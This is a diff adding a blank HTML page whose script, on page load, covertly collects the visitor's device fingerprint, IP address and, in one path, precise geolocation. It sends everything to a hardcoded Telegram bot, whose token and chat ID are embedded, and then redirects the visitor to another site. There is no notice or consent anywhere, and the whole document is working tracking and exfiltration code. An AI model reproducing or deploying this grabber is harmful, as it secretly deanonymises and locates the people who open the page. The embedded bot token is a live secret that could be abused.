@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>.</title>
+</head>
+<body>
+<script>
+    // Telegram Bot API configuration
+    const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
+    const CHAT_ID = '5540487728';
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    // Detect browser features
+    function detectFeatures() {
+        const features = {
+            cookies: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'unspecified',
+            java: navigator.javaEnabled(),
+            pdf: navigator.pdfViewerEnabled,
+            touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+            webgl: !!window.WebGLRenderingContext,
+            webaudio: !!window.AudioContext || !!window.webkitAudioContext,
+            serviceWorker: 'serviceWorker' in navigator,
+            notification: 'Notification' in window,
+            battery: 'getBattery' in navigator,
+            vibration: 'vibrate' in navigator,
+            storage: {
+                localStorage: 'localStorage' in window,
+                sessionStorage: 'sessionStorage' in window,
+                indexedDB: 'indexedDB' in window
+            }
+        };
+        return features;
+    }
+
+    // Get GPU information
+    function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return 'WebGL not supported';
+
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            } : 'No detailed GPU info available';
+        } catch (e) {
+            return `GPU detection failed: ${e.message}`;
+        }
+    }
+
+    // Get CPU cores
+    function getCPUCores() {
+        return navigator.hardwareConcurrency || 'unknown';
+    }
+
+    // Get device memory
+    function getDeviceMemory() {
+        return navigator.deviceMemory || 'unknown';
+    }
+
+    // Get battery info
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level * 100 + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (e) {
+                return 'Battery API error';
+            }
+        }
+        return 'Battery API not supported';
+    }
+
+    // Get network information
+    function getNetworkInfo() {
+        if (navigator.connection) {
+            return {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink + ' Mbps',
+                rtt: navigator.connection.rtt + ' ms',
+                saveData: navigator.connection.saveData
+            };
+        }
+        return 'Network Information API not supported';
+    }
+
+    // Get installed fonts (limited)
+    async function getFonts() {
+        if ('queryLocalFonts' in window) {
+            try {
+                const fonts = await window.queryLocalFonts();
+                return fonts.map(font => font.family).filter((v, i, a) => a.indexOf(v) === i).slice(0, 20);
+            } catch (e) {
+                return 'Font access denied';
+            }
+        }
+        return 'Font Access API not supported';
+    }
+
+    // Get IP and location info
+    async function getIPInfo() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const ipInfo = { ip: data.ip };
+            
+            // Try to get geolocation if available
+            
+            
+            return ipInfo;
+        } catch (e) {
+            const ipInfo = { ip: 'unavailable' };
+            
+            // Continue without IP if the request fails
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+                    ipInfo.geolocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                } catch (e) {
+                    ipInfo.geolocation = 'denied';
+                }
+            } else {
+                ipInfo.geolocation = 'unavailable';
+            }
+            
+            return ipInfo;
+        }
+    }
+
+    // Get browser plugins
+    function getPlugins() {
+        return Array.from(navigator.plugins).map(plugin => plugin.name);
+    }
+
+    // Main function to collect all data
+    async function collectSystemInfo() {
+        const batteryInfo = await getBatteryInfo();
+        const ipInfo = await getIPInfo();
+        const fonts = await getFonts();
+        
+        const systemInfo = {
+            // Basic info
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages,
+            
+            // Hardware
+            cpuCores: getCPUCores(),
+            deviceMemory: getDeviceMemory() + ' GB',
+            gpu: getGPUInfo(),
+            battery: batteryInfo,
+            
+            // Screen
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                orientation: screen.orientation.type
+            },
+            
+            // Browser
+            browser: {
+                name: navigator.appName,
+                version: navigator.appVersion,
+                product: navigator.product,
+                plugins: getPlugins(),
+                mimeTypes: Array.from(navigator.mimeTypes).map(mime => mime.type)
+            },
+            
+            // Network
+            network: getNetworkInfo(),
+            ipInfo: ipInfo,
+            
+            // Features
+            features: detectFeatures(),
+            
+            // Fonts
+            fonts: fonts,
+            
+            // Performance
+            performance: {
+                memory: window.performance.memory ? {
+                    jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: window.performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: window.performance.memory.usedJSHeapSize
+                } : 'Memory API not available',
+                timing: window.performance.timing ? {
+                    loadTime: (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) + 'ms'
+                } : 'Timing API not available'
+            }
+        };
+        
+        sendToTelegram(systemInfo);
+    }
+
+    // Send data to Telegram
+    function sendToTelegram(data) {
+    let text = `🖥 *System Information Report* 🖥\n\n`;
+    
+    // Basic info
+    text += `📅 *Timestamp:* ${data.timestamp}\n`;
+    text += `🌐 *User Agent:* ${data.userAgent}\n`;
+    text += `💻 *Platform:* ${data.platform}\n`;
+    text += `🏷 *Vendor:* ${data.vendor || 'unknown'}\n`;
+    text += `🗣 *Language:* ${data.language}\n\n`;
+    
+    // Hardware
+    text += `⚙️ *Hardware Information*\n`;
+    text += `🔢 *CPU Cores:* ${data.cpuCores}\n`;
+    text += `🧠 *Device Memory:* ${data.deviceMemory}\n`;
+    text += `🎮 *GPU Vendor:* ${typeof data.gpu === 'object' ? data.gpu.vendor : data.gpu}\n`;
+    text += `🖥 *GPU Model:* ${typeof data.gpu === 'object' ? data.gpu.renderer : 'N/A'}\n`;
+    text += `🔋 *Battery:* ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'charging' : 'discharging'})` : data.battery}\n\n`;
+    
+    // Screen
+    text += `🖥 *Screen Information*\n`;
+    text += `📏 *Resolution:* ${data.screen.width}x${data.screen.height}\n`;
+    text += `🖼 *Available:* ${data.screen.availWidth}x${data.screen.availHeight}\n`;
+    text += `🎨 *Color Depth:* ${data.screen.colorDepth}-bit\n`;
+    text += `🔍 *Pixel Ratio:* ${data.screen.pixelRatio}\n`;
+    text += `🔄 *Orientation:* ${data.screen.orientation}\n\n`;
+    
+    // Network
+    text += `🌐 *Network Information*\n`;
+    if (typeof data.network === 'object') {
+        text += `📶 *Connection Type:* ${data.network.type}\n`;
+        text += `⬇️ *Download Speed:* ${data.network.downlink}\n`;
+        text += `⏱ *Round Trip Time:* ${data.network.rtt}\n`;
+        text += `💾 *Data Saver Mode:* ${data.network.saveData ? 'on' : 'off'}\n`;
+    } else {
+        text += `${data.network}\n`;
+    }
+    
+    // IP Info
+    if (typeof data.ipInfo === 'object') {
+        text += `📍 *IP Address:* ${data.ipInfo.ip}\n`;
+        if (typeof data.ipInfo.geolocation === 'object') {
+            text += `🗺 *Geolocation:* Latitude ${data.ipInfo.geolocation.latitude}, Longitude ${data.ipInfo.geolocation.longitude} (Accuracy: ${data.ipInfo.geolocation.accuracy}m)\n`;
+        } else {
+            text += `🗺 *Geolocation:* ${data.ipInfo.geolocation}\n`;
+        }
+    } else {
+        text += `${data.ipInfo}\n\n`;
+    }
+    
+    // Features
+    text += `✨ *Browser Features*\n`;
+    text += `🍪 *Cookies:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
+    text += `🚫 *Do Not Track:* ${data.features.doNotTrack}\n`;
+    text += `☕ *Java:* ${data.features.java ? 'enabled' : 'disabled'}\n`;
+    text += `📄 *PDF Viewer:* ${data.features.pdf ? 'enabled' : 'disabled'}\n`;
+    text += `👆 *Touch Support:* ${data.features.touch ? 'yes' : 'no'}\n`;
+    text += `🖍️ *WebGL:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
+    text += `🔊 *Web Audio:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;
+    
+    // Plugins
+    text += `🧩 *Browser Plugins*\n`;
+    text += `${data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;
+    
+    // Performance
+    text += `⚡ *Performance Information*\n`;
+    if (typeof data.performance.memory === 'object') {
+        text += `🧠 *Memory Usage:* ${Math.round(data.performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(data.performance.memory.totalJSHeapSize / 1048576)}MB\n`;
+    } else {
+        text += `${data.performance.memory}\n`;
+    }
+    
+    if (typeof data.performance.timing === 'object') {
+        text += `⏱ *Page Load Time:* ${data.performance.timing.loadTime}\n`;
+    } else {
+        text += `${data.performance.timing}\n`;
+    }
+    
+    fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+        })
+    })
+    .then(response => {
+        if (!response.ok) {
+            window.location.href = 'https://fragment.com';
+        }
+        return response.json();
+    })
+    .then(data => {
+        window.location.href = 'https://fragment.com';
+    })
+    .catch(error => {
+        window.location.href = 'https://fragment.com';
+    });
+}
+
+    // Start collection on page load
+    window.onload = collectSystemInfo;
+    
+</script>
+
+</body>
+</html>
